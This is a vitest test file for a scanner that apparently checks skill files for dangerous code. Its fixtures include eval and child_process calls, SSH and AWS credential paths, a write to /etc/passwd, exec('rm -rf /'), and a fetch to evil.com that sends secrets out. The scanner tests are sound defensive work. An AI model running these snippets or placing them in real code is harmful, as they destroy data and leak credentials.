import { describe, it, expect } from "vitest";
import { scanContent } from "../checks/content-scan";

describe("content-scan", () => {
  // Critical — must fail
  it("detects eval()", () => {
    const results = scanContent('const x = eval("malicious code")');
    expect(results.some((r) => r.status === "fail" && r.name === "eval")).toBe(true);
  });

  it("detects new Function()", () => {
    const results = scanContent('const fn = new Function("return 1")');
    expect(results.some((r) => r.status === "fail" && r.name === "new-function")).toBe(true);
  });

  it("detects require('child_process')", () => {
    const results = scanContent("const cp = require('child_process')");
    expect(results.some((r) => r.status === "fail" && r.name === "child-process-require")).toBe(true);
  });

  it("detects dynamic import of child_process", () => {
    const results = scanContent("const cp = await import('child_process')");
    expect(results.some((r) => r.status === "fail" && r.name === "child-process-import")).toBe(true);
  });

  it("detects SSH key path references", () => {
    const results = scanContent('const key = "~/.ssh/id_rsa"');
    expect(results.some((r) => r.status === "fail" && r.name === "ssh-key-path")).toBe(true);
  });

  it("detects AWS credential references", () => {
    const results = scanContent('const creds = "~/.aws/credentials"');
    expect(results.some((r) => r.status === "fail" && r.name === "aws-credentials")).toBe(true);
  });

  it("detects crypto mining", () => {
    const results = scanContent("CoinHive.Anonymous('sitekey')");
    expect(results.some((r) => r.status === "fail" && r.name === "coinhive")).toBe(true);
  });

  it("detects writing to system paths", () => {
    const results = scanContent("fs.writeFile('/etc/passwd', data)");
    expect(results.some((r) => r.status === "fail")).toBe(true);
  });

  // High — warn
  it("detects external fetch calls", () => {
    const results = scanContent('fetch("https://evil.com/collect")');
    expect(results.some((r) => r.status === "warn" && r.name === "external-fetch")).toBe(true);
  });

  it("detects long base64 strings", () => {
    const longBase64 = "A".repeat(250);
    const results = scanContent(`const payload = "${longBase64}"`);
    expect(results.some((r) => r.status === "warn" && r.name === "long-base64")).toBe(true);
  });

  it("detects exec calls", () => {
    const results = scanContent("exec('rm -rf /')");
    expect(results.some((r) => r.status === "warn" && r.name === "exec-call")).toBe(true);
  });

  // Safe content — should pass
  it("passes clean SKILL.md content", () => {
    const clean = `---
name: my-skill
description: A helpful skill for coding
---

# My Skill

This skill helps with code review. It looks at your code and suggests improvements.

## How to use

Run the skill and follow the prompts.
`;
    const results = scanContent(clean);
    const failures = results.filter((r) => r.status === "fail");
    expect(failures.length).toBe(0);
  });

  it("passes content with localhost fetch", () => {
    const results = scanContent('fetch("http://localhost:3000/api/data")');
    const failures = results.filter((r) => r.name === "external-fetch");
    expect(failures.length).toBe(0);
  });

  it("returns empty array for empty content", () => {
    const results = scanContent("");
    expect(results).toEqual([]);
  });

  // Edge cases
  it("detects multiple issues in one file", () => {
    const malicious = `
      const cp = require('child_process');
      eval(userInput);
      fetch("https://evil.com/exfil?data=" + secrets);
    `;
    const results = scanContent(malicious);
    expect(results.length).toBeGreaterThanOrEqual(3);
  });

  it("is case insensitive for dangerous patterns", () => {
    const results = scanContent('EVAL("code")');
    expect(results.some((r) => r.name === "eval")).toBe(true);
  });
});
